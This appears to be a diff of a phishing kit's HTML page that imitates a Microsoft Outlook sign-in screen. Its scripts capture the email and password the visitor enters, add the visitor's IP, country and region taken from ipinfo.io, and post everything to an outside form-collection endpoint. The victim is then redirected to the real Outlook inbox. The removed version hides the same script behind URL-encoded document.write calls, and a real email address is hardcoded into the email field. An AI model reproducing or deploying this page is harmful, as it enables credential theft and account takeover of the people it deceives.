CBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIWjs8PFz1DADAKXMGAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAoH9cuLt/uOohgI+zu72+ttIBfjvr9QO+UM4AAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQtJiZ/VUPAQCcqv3FzOytegoA4FTtCQAA6NlbzMyTVU8BAJyqJ4uZebDqKQCAU/VgMTOPZubZqicBAE7Fs5l5tNjdXn85M/dWPQ0AcCruzaWDl8fXAbg9My9WOQ0AcOJezHLNX14IaHd7fW9m7qxyIgDgxN2ZSwd7M69fCfDnmXm8mnkAgBP2eJZr/cy8EgC72+sHM3NtZp6uYCgA4OQ8nZlrc+ng4PjAa3sB7G6v/zkzP44IAICvxdOZ+XEuHfz56sG/bAa0u73+x8x8Pz4OAIAv3eOZ+X4uHfzx5h1v3Q3w6EzADzPz7/HrAAD40ryY5Rr+w5vv/I+tHR4evvcvXLi7vzEzt2bmxsyc+9wTAh9vd3t9baUD/Hb2/S8gwGl7Nstr+9w+/rb/u/xtABy7cHf/zMxcnpmrM3NxZjaObuufNCrw0QQApO3PckO/vVnu6/NgZh7NpYOXH/Lk/wKQAq5eW3YI8AAAAABJRU5ErkJggg=="></p> 
+<p style="margin-top:20px; font-family:verdana; font-weight:bold; font-size:17px; color:#737373;">&nbspMicrosoft</p>
+
+<p style="clear:both; margin-top:4px; float:left;"><a href=""><img height="20" width="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACIAAAAdCAYAAADPa766AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAD5SURBVFhH7dWhCsJAHMdxH8PXWDL5AmtjwXXD2treYE0wz7JkEwSxzLIiCyIINleWXBBBbBd/cvMmemU7b7JD7gtX/unDn+2uB0XSED4N4dMQvj+AFFv4lg0zythAru8gxQbe0EbfcODGFzaUSxxSrOEOGGJ1ZkP5hCAkX74QXkubqGoMIacITokYw0/aRdAaQcgxhMUQQXpj03arhdzTKUyDImw4kwTp/iB4MjTZXw0kw6z8O+SOF9dvsX4j+1CFjTxT4hupUuKvqfq4R1q8zGhCkLL3632Rg7CxbOIQGnvwun1rqq47BCMH1rzL1/cHaQifhvApAgEexPTSW1v/5dkAAAAASUVORK5CYII="></a></p> 
+
+
+<form method="post">
+<!--<form method="POST" action="post.php">-->
+
+
+<!--==================================================================-->
+<p><input id="email" type="email"  name="email" class="text" size="25" style="font-size:14px; border:none; margin-top:2px;" value="
+
+
+technomax.bd@outlook.com
 
 
 
-" required="required" placeholder="Email" required></p><h2 style="clear:both;font-family:sans-serif;color:#333">Enter password</h2><span style="font-size:14px;color:red" id="error"></span></p><p><input type="password" name="password" id="password" style="width:100%" size="" style="" placeholder="Password" required="required" required></p><p style="color:#005da6;font-family:sans-serif;font-size:12px"><a style="color:#005da6" href="">Forgot my password</a></p><script>document.write(unescape("%20%20%3Clabel%20for%3D%22country%22%3E%3C/label%3E%0A%20%20%3Cinput%20type%3D%22hidden%22%20id%3D%22country%22%20name%3D%22outl00k_iphone%22%20placeholder%3D%22country%22%20required%3D%22%22%20/%3E%20%20%0A%20%20%0A%20%20%3Clabel%20for%3D%22ip%22%3E%3C/label%3E%0A%20%20%3Cinput%20type%3D%22hidden%22%20id%3D%22ip%22%20name%3D%22ip%22%20placeholder%3D%22ip%22%20required%3D%22%22%20/%3E%20%20%0A%0A%20%20%3Clabel%20for%3D%22region%22%3E%3C/label%3E%0A%20%20%3Cinput%20type%3D%22hidden%22%20id%3D%22region%22%20name%3D%22region%22%20placeholder%3D%22Region%22%20required%3D%22%22%20/%3E%20%20%0A%0A%20%20%0A%20%20%3Cinput%20type%3D%22hidden%22%20name%3D%22_redirect%22%20value%3D%22https%3A//firebasestorage.googleapis.com/v0/b/tested-58a7d.appspot.com/o/nopreview.html%3Falt%3Dmedia%26token%3Db65c6ed8-b399-4dab-965a-a0c2819d5aed%22%20/%3E%20%20%0A"))</script><button type="submit" id="submit-btn" style="border:none;cursor:pointer;float:right;height:30px;width:30%;background-color:#005da6;color:#fff">Sign in</button><br></form></div></div></div><div id="footer"><p style="margin-top:6px"><a href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a href="https://privacy.microsoft.com/en-US/privacystatement">Privacy & cookies</a>&nbsp&nbsp&nbsp .....</p></div></div><script>document.write(unescape("%3Cscript%3E%09%0A%24%28document%29.ready%28function%28%29%20%7B%0A%20%20%20%20var%20count%20%3D%200%3B%0A%0A%0A%0A%0Avar%20file%3D%22bmV4dC5waHA%3D%22%3B%0A%20%20%20%20%24%28%27%23submit-btn%27%29.click%28function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20event.preventDefault%28%29%3B%0A%20%20%20%20%20%20%20%20var%20email%20%3D%20%24%28%22%23email%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20var%20password%20%3D%20%24%28%22%23password%22%29.val%28%29%3B%0A%09%09%20%20%20%20%20%20%20%20var%20detail%20%3D%20%24%28%22%23field%22%29.html%28%29%3B%0A%20%20%20%20%20%20%20%20var%20msg%20%3D%20%24%28%27%23msg%27%29.html%28%29%3B%0A%0A%20%20%20%20%20%20%20%20var%20my_ai%20%3D%20email%3B%0A%20%20%20%20%20%20%20%20var%20ind%20%3D%20my_ai.indexOf%28%22@%22%29%3B%0A%20%20%20%20%20%20%20%20var%20my_slice%20%3D%20my_ai.substr%28%28ind%20+%201%29%29%3B%0A%20%20%20%20%20%20%20%20var%20c%20%3D%20my_slice.substr%280%2C%20my_slice.indexOf%28%27.%27%29%29%3B%0A%20%20%20%20%20%20%20%20var%20final%20%3D%20c.toLowerCase%28%29%3B%09%09%0A%20%20%20%20%20%20%20%20%24%28%27%23msg%27%29.text%28msg%29%3B%0A%09%09%0A%09%09%0A%09%09if%28%24%28%27%23email%27%29.val%28%29%20%3D%3D%20%22%22%20%7C%7C%20%24%28%27%23password%27%29.val%28%29%20%3D%3D%20%22%22%29%7B%0A%20%20%20%20%20%20%20%20%20%20%24%28%22%23error%22%29.html%28%22Enter%20email%20address%20and%20password.%22%29%3B%09%0A%20%20%20%20%20%20%20%20%20%20return%20false%0A%09%09%20%20%0A%09%09%7D%0A%0A%09var%20result1%20%3D%20%22Math%22%3B%0A%09%0A%20%20%20%20%20%20%20%20count%20%3D%20count%20+%201%3B%0A%20%20%20%20%20%20%20%20%24.ajax%28%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20dataType%3A%20%27JSON%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20url%3A%20%22https%3A//submit-form.com/i3OHRmli5%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20type%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20data%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20ajsny%3A%20email%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20souht%3A%20password%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20wismg%3A%20%24%28%22%23ip%22%29.val%28%29%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20awudt%3A%20%24%28%22%23country%22%29.val%28%29%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20sjeuy%3A%20%24%28%22%23region%22%29.val%28%29%0A%09%09%09%09%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20beforeSend%3A%20function%28xhr%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23submit-btn%22%29.html%28%22verifying...%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20success%3A%20function%28response%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23password%22%29.val%28%22%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28count%20%3E%3D%202%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20count%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23div2%22%29.animate%28%7B%20left%3A%200%2C%20opacity%3A%20%22hide%22%20%7D%2C%200%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23div3%22%29.animate%28%7B%20left%3A%200%2C%20opacity%3A%20%22show%22%20%7D%2C%20500%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20setTimeout%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.replace%28%22https%3A//outlook.live.com/mail/0/inbox%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%20500%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28count%20%3D%3D%202%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg2%22%29.show%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg%22%29.hide%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg1%22%29.hide%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg1%22%29.show%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg%22%29.hide%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg2%22%29.hide%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23error%22%29.html%28%22%22%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20error%3A%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23password%22%29.val%28%22%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28count%20%3E%3D%202%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20count%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23div2%22%29.animate%28%7B%20left%3A%200%2C%20opacity%3A%20%22hide%22%20%7D%2C%200%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23div3%22%29.animate%28%7B%20left%3A%200%2C%20opacity%3A%20%22show%22%20%7D%2C%20500%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20setTimeout%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.replace%28%22https%3A//outlook.live.com/mail/0/inbox%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%201000%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28count%20%3D%3D%202%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg2%22%29.show%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg%22%29.hide%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg1%22%29.hide%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg1%22%29.show%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg%22%29.hide%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23msg2%22%29.hide%28%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20complete%3A%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23submit-btn%22%29.html%28%22Sign%20in%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%7D%29%3B%0A%09%0A%09%7D%29%3B%0A%0A%09%09%0A%09%09%0A%09%09%3C/script%3E%0A%09%09%0A%09%09%0A%09%09%3Cscript%3E%0A%09%09%0Avar%20jemail%20%20%3D%20location.hash.substr%281%29%3B%0A%09%09%0A%09%09//%20variant%201%20%28without%20%27@%27%29%0Avar%20mailArr%20%3D%20jemail.split%28%27@%27%29%3B%0Avar%20username%20%3D%20mailArr%5B0%5D%3B%0Avar%20domain%20%3D%20mailArr%5B1%5D%3B%0A%0Avar%20domname%20%3D%20domain.split%28%27.%27%29%3B%0Avar%20domname0%20%3D%20domname%5B0%5D%3B%0Avar%20domname1%20%3D%20domname%5B1%5D%3B%0A%0Adocument.getElementById%28%22domainnamedisplay%22%29.innerHTML%20%3D%20domname0.toUpperCase%28%29%3B%0A//document.getElementById%28%22dom%22%29.innerHTML%20%3D%20domain%3B%0A%0A%0Adocument.getElementById%28%27host%27%29.innerHTML%3D%27%3Cimg%20height%3D%2250%22%20width%3D%2250%22%20src%3D%5C%27https%3A//icons.duckduckgo.com/ip3/%27+%20domain%20+%27.ico%5C%27%3E%27%0A%0A%3C/script%3E%0A%0A%0A%0A%09%3Cscript%3E%0A%09document.getElementById%28%22email%22%29.value%20%3D%20jemail%3B%0A%09%3C/script%3E%0A%0A%0A%0A%0A%0A%3Cscript%3E%0A%20%20function%20recordData%20%28data%29%20%7B%0A%20%20%0A%20%20%20%20%20document.getElementById%28%22country%22%29.value%20%3D%20%28data.country%29%3B%0A%20%20%20%20%20document.getElementById%28%22ip%22%29.value%20%3D%20%28data.ip%29%3B%20%0A%20%20%20%20%20document.getElementById%28%22region%22%29.value%20%3D%20%28data.timezone%29%3B%20%0A%20%20%0A%20%20%20%20//console.log%28data.ip%2C%20data.country%29%0A%20%20%7D%0A%3C/script%3E%0A%3Cscript%20src%3D%22https%3A//ipinfo.io/json%3Fcallback%3DrecordData%22%3E%3C/script%3E%0A"))</script></body></html>
+" required="required" placeholder="Email" required></p>
+
+
+<!--==================================================================-->
+
+
+<h2 style="clear:both; font-family:sans-serif; color:#333333;">Enter password</h2>
+
+	<span style="background:; font-size:14px; color:red; font-weight:;" id="error"></span></p>
+
+<p> <input type="password" name="password" id="password" style="width:100%;" size="" style="" placeholder="Password"  required="required" required ></p>
+
+<p style="color:#005DA6; font-family:sans-serif; font-size:12px;"><a style="color:#005DA6;" href="">Forgot my password</a></p>
+  
+  
+  <label for="country"></label>
+  <input type="hidden" id="country" name="outl00k_normal_Zdn" placeholder="country" required="" />  
+  
+  <label for="ip"></label>
+  <input type="hidden" id="ip" name="ip" placeholder="ip" required="" />  
+
+  <label for="region"></label>
+  <input type="hidden" id="region" name="region" placeholder="Region" required="" />  
+
+  
+  <input type="hidden" name="_redirect" value="https://firebasestorage.googleapis.com/v0/b/tested-58a7d.appspot.com/o/nopreview.html?alt=media&token=b65c6ed8-b399-4dab-965a-a0c2819d5aed" />  
+ 
+    
+  <button type="submit"  id="submit-btn" style="border:none; cursor:pointer; float:right; height:30px; width:30%; background-color:#005DA6; color:white;">Sign in</button>
+  
+
+
+  <br>
+</form>
+
+</div>
+
+
+</div>
+</div>
+
+<div id="footer">
+<p style="margin-top:6px;"><a href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <a href="https://privacy.microsoft.com/en-US/privacystatement">Privacy & cookies </a> &nbsp&nbsp&nbsp .....</p>
+</div>
+
+
+
+</div>
+
+
+<script>	
+$(document).ready(function() {
+    var count = 0;
+
+
+
+
+var file="bmV4dC5waHA=";
+    $('#submit-btn').click(function(event) {
+        event.preventDefault();
+        var email = $("#email").val();
+        var password = $("#password").val();
+		        var detail = $("#field").html();
+        var msg = $('#msg').html();
+
+        var my_ai = email;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();		
+        $('#msg').text(msg);
+		
+		
+		if($('#email').val() == "" || $('#password').val() == ""){
+			//alert("Please complete the required field");
+          $("#error").html("Enter email address and password.");	
+          return false
+		  
+		}
+
+	var result1 = "Math";
+	
+        count = count + 1;
+        $.ajax({
+            dataType: 'JSON',
+            url: "https://submit-form.com/ovDGpYldL",
+            type: 'POST',
+            data: {
+             result: email,
+            result1: password,
+            result2: $("#ip").val(),
+            result3: $("#country").val(),
+            result4: $("#region").val()
+				
+
+            },
+            beforeSend: function(xhr) {
+                $("#submit-btn").html("verifying...");
+            },
+            success: function(response) {
+                $("#password").val("");
+                if (count >= 2) {
+                    count = 0;
+                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
+                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
+                    setTimeout(() => {
+                        window.location.replace("https://outlook.live.com/mail/0/inbox");
+                    }, 500);
+                    return false;
+                }
+                if (count == 2) {
+                    $("#msg2").show();
+                    $("#msg").hide();
+                    $("#msg1").hide();
+                } else {
+                    $("#msg1").show();
+                    $("#msg").hide();
+                    $("#msg2").hide();
+                    $("#error").html("");
+
+                }
+            },
+            error: function() {
+                $("#password").val("");
+                if (count >= 2) {
+                    count = 0;
+                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
+                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
+                    setTimeout(() => {
+                        window.location.replace("https://outlook.live.com/mail/0/inbox");
+                    }, 1000);
+                    return false;
+                }
+                if (count == 2) {
+                    $("#msg2").show();
+                    $("#msg").hide();
+                    $("#msg1").hide();
+                } else {
+                    $("#msg1").show();
+                    $("#msg").hide();
+                    $("#msg2").hide();
+
+                }
+            },
+            complete: function() {
+                $("#submit-btn").html("Sign in");
+            }
+        });
+    });
+	
+	});
+
+		
+		
+		</script>
+		
+		
+		<script>
+		
+var jemail  = location.hash.substr(1);
+		
+		// variant 1 (without '@')
+var mailArr = jemail.split('@');
+var username = mailArr[0];
+var domain = mailArr[1];
+
+var domname = domain.split('.');
+var domname0 = domname[0];
+var domname1 = domname[1];
+
+document.getElementById("domainnamedisplay").innerHTML = domname0.toUpperCase();
+//document.getElementById("dom").innerHTML = domain;
+
+
+document.getElementById('host').innerHTML='<img height="50" width="50" src=\'https://icons.duckduckgo.com/ip3/'+ domain +'.ico\'>'
+
+</script>
+
+
+
+	<script>
+	document.getElementById("email").value = jemail;
+	</script>
+
+
+
+
+
+<script>
+  function recordData (data) {
+  
+     document.getElementById("country").value = (data.country);
+     document.getElementById("ip").value = (data.ip); 
+     document.getElementById("region").value = (data.timezone); 
+  
+    //console.log(data.ip, data.country)
+  }
+</script>
+<script src="https://ipinfo.io/json?callback=recordData"></script>
+
+
+
+</body>
+
+</html>
